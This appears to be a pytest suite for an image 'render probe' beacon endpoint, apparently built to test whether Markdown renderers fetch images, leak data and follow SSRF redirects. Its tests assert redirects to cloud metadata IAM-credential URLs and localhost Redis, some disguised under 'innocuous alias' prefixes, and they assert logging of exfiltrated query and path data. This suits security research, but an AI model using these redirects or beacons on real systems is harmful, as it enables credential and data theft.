"""
Tests for render_probe endpoint — Markdown image render beacon.

Verifies each probe case returns the correct image payload and that
the logging captures request metadata (IP, UA, query/path data).
"""
import json
from datetime import datetime, timedelta, timezone

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.endpoints.render_probe import router, _TRANSPARENT_GIF, _TRANSPARENT_PNG


@pytest.fixture
def client():
    app = FastAPI()
    app.include_router(router)
    return TestClient(app)


class TestImageCases:
    """Each case returns a valid image with the right content-type."""

    def test_gif(self, client):
        resp = client.get("/probe/gif/test.gif")
        assert resp.status_code == 200
        assert "image/gif" in resp.headers["content-type"]
        assert resp.content == _TRANSPARENT_GIF

    def test_png(self, client):
        resp = client.get("/probe/png/test.png")
        assert resp.status_code == 200
        assert "image/png" in resp.headers["content-type"]
        assert resp.content == _TRANSPARENT_PNG

    def test_svg(self, client):
        resp = client.get("/probe/svg/test.svg")
        assert resp.status_code == 200
        assert "image/svg+xml" in resp.headers["content-type"]
        assert b"<svg" in resp.content

    def test_no_extension(self, client):
        resp = client.get("/probe/ne/test-noext")
        assert resp.status_code == 200
        assert "image/gif" in resp.headers["content-type"]

    def test_404_status(self, client):
        resp = client.get("/probe/404/test.gif")
        assert resp.status_code == 404
        # Still returns a GIF body
        assert resp.content == _TRANSPARENT_GIF

    def test_catchall(self, client):
        resp = client.get("/probe/anything-unmatched")
        assert resp.status_code == 200
        assert "image/gif" in resp.headers["content-type"]


class TestSVGScriptComparison:
    @pytest.mark.parametrize("case,script_count", [("svg-control", 0), ("svg-script", 1)])
    def test_svg_fixture_response_and_log(self, client, case, script_count):
        from xml.etree import ElementTree as ET

        marker = f"fixture-{case}.svg"
        response = client.get(f"/probe/{case}/{marker}")
        assert response.status_code == 200
        assert response.headers["content-type"].startswith("image/svg+xml")
        assert "no-store" in response.headers["cache-control"]
        assert response.headers["x-content-type-options"] == "nosniff"
        root = ET.fromstring(response.content)
        ns = {"s": "http://www.w3.org/2000/svg"}
        assert root.attrib["width"] == "480"
        assert root.attrib["height"] == "120"
        assert root.find("s:text", ns).text == "NOT_EXECUTED"
        assert len(root.findall("s:script", ns)) == script_count
        assert marker not in response.text
        logs = client.get("/probe/logs", params={"marker": marker}).json()
        assert logs["entries"][0]["case"] == case

    def test_script_is_only_difference_and_markers_do_not_change_body(self, client):
        import re

        control = client.get("/probe/svg-control/comparison.svg")
        scripted = client.get("/probe/svg-script/comparison.svg")
        assert control.status_code == scripted.status_code == 200
        without_script = re.sub(r"  <script\b.*?</script>\n", "", scripted.text, count=1, flags=re.S)
        assert without_script == control.text
        assert client.get("/probe/svg-script/another-marker.svg").content == scripted.content


class TestRedirectCase:
    def test_redirect_returns_302(self, client):
        resp = client.get("/probe/r/test-marker", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "/probe/gif/test-marker-redirected"


class TestRTRedirectCase:
    def test_meta_prefix_redirects_to_private(self, client):
        """Marker starting with 'meta-' redirects to a private link-local address."""
        resp = client.get("/probe/rt/meta-check-001.gif", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "http://169.254.169.254/latest/meta-data/"

    def test_metaiam_prefix_redirects_to_credentials(self, client):
        """Marker starting with 'metaiam-' redirects to IAM credentials path."""
        resp = client.get("/probe/rt/metaiam-check.gif", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

    def test_self_prefix_redirects_to_gif(self, client):
        """Marker starting with 'self-' redirects back to a gif endpoint (control test)."""
        resp = client.get("/probe/rt/self-control.gif", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "/probe/gif/self-control-followed"

    def test_redis_prefix_redirects_to_localhost(self, client):
        """Marker starting with 'redis-' redirects to localhost Redis."""
        resp = client.get("/probe/rt/redis-check.gif", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "http://localhost:6379/"

    def test_unknown_prefix_serves_gif(self, client):
        """Unknown prefix serves a GIF directly (no redirect)."""
        resp = client.get("/probe/rt/unknown-marker.gif")
        assert resp.status_code == 200
        assert "image/gif" in resp.headers["content-type"]

    def test_rt_hit_logged_with_target(self, client):
        """The rt redirect logs the initial hit with the redirect target."""
        client.get("/probe/rt/meta-log-test.gif")
        logs = client.get("/probe/logs").json()
        entry = [e for e in logs["entries"] if e["marker"] == "meta-log-test.gif"][0]
        assert entry["case"] == "rt"
        assert entry["redirect_to"] == "http://169.254.169.254/latest/meta-data/"

    def test_diag_prefix_redirects_to_private(self, client):
        """'diag-' is an innocuous alias for the same private target."""
        resp = client.get("/probe/rt/diag-check-001.gif", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "http://169.254.169.254/latest/meta-data/"

    def test_diagiam_prefix_redirects_to_credentials(self, client):
        """'diagiam-' is an innocuous alias for the IAM credentials path."""
        resp = client.get("/probe/rt/diagiam-check.gif", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

    def test_render_prefix_redirects_to_private(self, client):
        """'render-' is an innocuous alias."""
        resp = client.get("/probe/rt/render-check-001.gif", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "http://169.254.169.254/latest/meta-data/"

    def test_canary_prefix_redirects_to_meta(self, client):
        """'canary-' redirects to Meta's internal bug bounty canary endpoint."""
        resp = client.get("/probe/rt/canary-001.gif", follow_redirects=False)
        assert resp.status_code == 302
        assert resp.headers["location"] == "https://www.internalfb.com/intern/bug-bounty/get-canary-token/"

    def test_self_control_produces_second_hit(self, client):
        """Full self-control chain: rt hit + redirected gif hit both logged."""
        client.get("/probe/rt/self-chain-test.gif", follow_redirects=True)
        logs = client.get("/probe/logs").json()
        rt_entries = [e for e in logs["entries"] if e["case"] == "rt" and "self-chain-test" in e["marker"]]
        gif_entries = [e for e in logs["entries"] if e["case"] == "gif" and "self-chain-test-followed" in e["marker"]]
        assert len(rt_entries) >= 1
        assert len(gif_entries) >= 1


class TestDataExfiltrationCapture:
    def test_query_data_logged(self, client):
        client.get("/probe/q/exfil.gif?secret=my-data&other=123")
        logs = client.get("/probe/logs").json()
        entry = [e for e in logs["entries"] if e["marker"] == "exfil.gif"]
        assert len(entry) == 1
        assert entry[0]["captured_query_data"]["secret"] == "my-data"
        assert entry[0]["captured_query_data"]["other"] == "123"

    def test_path_data_logged(self, client):
        client.get("/probe/p/c29tZS1iYXNlNjQtZGF0YQ")
        logs = client.get("/probe/logs").json()
        entry = [e for e in logs["entries"] if e["case"] == "p"]
        assert len(entry) >= 1
        assert entry[0]["captured_path_data"] == "c29tZS1iYXNlNjQtZGF0YQ"


class TestLogging:
    def test_logs_endpoint(self, client):
        client.get("/probe/gif/logged.gif", headers={
            "User-Agent": "test-ua/1.0",
            "Referer": "https://example.com",
        })
        logs = client.get("/probe/logs").json()
        assert logs["count"] >= 1
        entry = logs["entries"][0]
        assert entry["case"] == "gif"
        assert entry["marker"] == "logged.gif"
        assert entry["user_agent"] == "test-ua/1.0"
        assert entry["referer"] == "https://example.com"

    def test_summary_endpoint(self, client):
        client.get("/probe/gif/summary.gif")
        client.get("/probe/png/summary.png")
        summary = client.get("/probe/summary").json()
        assert summary["total_hits"] >= 2
        assert "gif" in summary["by_case"]
        assert "png" in summary["by_case"]

    def test_html_logs(self, client):
        client.get("/probe/gif/html-view.gif")
        resp = client.get("/probe/logs?format=html")
        assert resp.status_code == 200
        assert "Render Probe Logs" in resp.text
        assert "html-view.gif" in resp.text

    def test_logs_filter_by_marker(self, client):
        client.get("/probe/gif/filter-target.gif")
        client.get("/probe/gif/other.gif")
        logs = client.get("/probe/logs?marker=filter-target").json()
        markers = [e["marker"] for e in logs["entries"]]
        assert all("filter-target" in m for m in markers)

    def test_sensitive_headers_redacted(self, client):
        client.get("/probe/gif/redact.gif", headers={
            "Authorization": "Bearer super-secret-token",
        })
        logs = client.get("/probe/logs").json()
        entry = [e for e in logs["entries"] if e["marker"] == "redact.gif"][0]
        assert entry["headers"]["authorization"] == "[redacted]"


class TestSlowCase:
    def test_slow_response(self, client):
        import time
        start = time.time()
        resp = client.get("/probe/slow/200/test-slow.gif")
        elapsed = time.time() - start
        assert resp.status_code == 200
        assert elapsed >= 0.18  # at least ~200ms

    def test_slow_caps_at_30s(self, client):
        resp = client.get("/probe/slow/999999/test-slow.gif")
        assert resp.status_code == 200


class TestControlledLoopback:
    @pytest.fixture
    def fixture_config(self, monkeypatch):
        config = {
            "port": 35397,
            "path": "/probe-daaeea2253fc7e049892e350bd45c7c1",
            "expires_at": int((datetime.now(timezone.utc) + timedelta(minutes=10)).timestamp()),
        }
        monkeypatch.setenv("PROBE_LOOPBACK_FIXTURE", json.dumps(config))
        return config

    @pytest.mark.parametrize("host", ["127.0.0.1", "localhost"])
    def test_redirect_is_pinned_and_does_not_claim_arrival(self, client, fixture_config, host):
        marker = f"controlled-{host}.gif"
        response = client.get(
            f"/probe/loopback/{host}/{marker}",
            params={"port": 6379, "target": "http://example.com/", "path": "/etc/passwd"},
            follow_redirects=False,
        )
        assert response.status_code == 302
        assert response.headers["location"] == (
            f"http://{host}:35397/probe-daaeea2253fc7e049892e350bd45c7c1"
        )
        assert "no-store" in response.headers["cache-control"]
        entry = client.get("/probe/logs", params={"marker": marker}).json()["entries"][0]
        assert entry["event"] == "redirect_issued"
        assert entry["redirect_to"] == response.headers["location"]
        assert "proxy followed" not in entry.get("note", "")

    def test_disabled_without_configuration(self, client, monkeypatch):
        monkeypatch.delenv("PROBE_LOOPBACK_FIXTURE", raising=False)
        response = client.get("/probe/loopback/127.0.0.1/disabled.gif", follow_redirects=False)
        assert response.status_code == 404
        assert "location" not in response.headers

    @pytest.mark.parametrize("host", ["169.254.169.254", "example.com", "localhost.evil.test", "[::1]"])
    def test_unconfigured_hosts_rejected(self, client, fixture_config, host):
        response = client.get(f"/probe/loopback/{host}/bad-host.gif", follow_redirects=False)
        assert response.status_code == 422
        assert "location" not in response.headers

    @pytest.mark.parametrize("change", [
        {"port": 80}, {"port": 65536}, {"port": "35397"}, {"port": True},
        {"path": "/etc/passwd"}, {"path": "//example.com/"},
        {"path": "/probe-daaeea2253fc7e049892e350bd45c7c1?x=1"},
        {"expires_at": "tomorrow"}, {"expires_at": True},
        {"host": "example.com"},
    ])
    def test_invalid_configuration_fails_closed(self, client, monkeypatch, fixture_config, change):
        fixture_config.update(change)
        monkeypatch.setenv("PROBE_LOOPBACK_FIXTURE", json.dumps(fixture_config))
        response = client.get("/probe/loopback/localhost/invalid.gif", follow_redirects=False)
        assert response.status_code == 503
        assert "location" not in response.headers

    @pytest.mark.parametrize("raw", ["{", "[]", "null", "{}"])
    def test_malformed_configuration_fails_closed(self, client, monkeypatch, raw):
        monkeypatch.setenv("PROBE_LOOPBACK_FIXTURE", raw)
        response = client.get("/probe/loopback/localhost/malformed.gif", follow_redirects=False)
        assert response.status_code == 503
        assert "location" not in response.headers

    def test_expired_fixture_never_redirects(self, client, monkeypatch, fixture_config):
        fixture_config["expires_at"] = int(datetime.now(timezone.utc).timestamp()) - 1
        monkeypatch.setenv("PROBE_LOOPBACK_FIXTURE", json.dumps(fixture_config))
        response = client.get("/probe/loopback/127.0.0.1/expired.gif", follow_redirects=False)
        assert response.status_code == 410
        assert "location" not in response.headers

    def test_existing_rt_log_does_not_claim_a_followed_redirect(self, client):
        marker = "self-nofollow-regression.gif"
        response = client.get(f"/probe/rt/{marker}", follow_redirects=False)
        assert response.status_code == 302
        entry = client.get("/probe/logs", params={"marker": marker}).json()["entries"][0]
        assert entry["event"] == "redirect_issued"
        assert "proxy followed" not in entry["note"]
